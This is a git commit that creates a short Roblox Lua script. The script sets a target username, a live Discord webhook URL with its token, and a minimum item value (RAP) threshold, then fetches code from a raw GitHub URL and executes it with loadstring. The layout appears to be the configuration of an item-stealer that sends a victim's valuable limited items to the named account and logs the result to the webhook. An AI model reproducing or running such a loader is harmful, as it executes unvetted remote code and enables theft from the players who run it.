2afa9465f2bd5af607565edafebd190a2b3d3913
RizHub <127007984+wwzeze@users.noreply.github.com>
2024-02-10 12:10:22 +0800

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,9 @@
+Username = "1jk70"
+Username2 = "1jk70"
+Webhook = "https://discord.com/api/webhooks/1173571038739701841/sIbggm0A9q2rMlQfFeBbsX8M2HRfh_9HuXWXrpubdZ48ZckQa7ktVZWAMt0K40ceYu8F"
+
+LoadingScreen = false
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiroOnTop/JustAnotherScript/main/Script.lua"))()
